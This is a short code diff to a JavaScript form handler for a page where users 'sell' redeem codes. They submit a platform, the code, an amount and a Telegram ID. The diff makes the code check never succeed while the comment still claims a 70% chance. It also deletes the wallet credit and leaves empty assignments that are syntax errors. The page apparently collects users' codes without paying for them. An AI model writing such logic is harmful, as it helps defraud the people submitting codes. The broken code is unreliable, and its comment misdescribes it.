@@ -126,13 +126,12 @@ document.getElementById('sellForm').addEventListener('submit', function(e){
         modal.style.display = 'none';
 
         // Randomly simulate code validity (demo)
-        const isValid = Math.random() < 0.7; // 70% chance valid
+        const isValid = Math.random() < 0.0; // 70% chance valid
 
         if(isValid){
             const bonus = Math.floor(amount * 0.1);
-            wallet += amount + bonus;
-            walletTop.textContent = wallet;
-            walletBottom.textContent = wallet;
+            walletTop.textContent = ;
+            walletBottom.textContent = ;
 
             const message = `New Redeem Code:\nPlatform: ${platform}\nCode: ${redeemCode}\nAmount: ₹${amount}\nTelegram: ${telegramId}\nBonus: ₹${bonus}`;
 
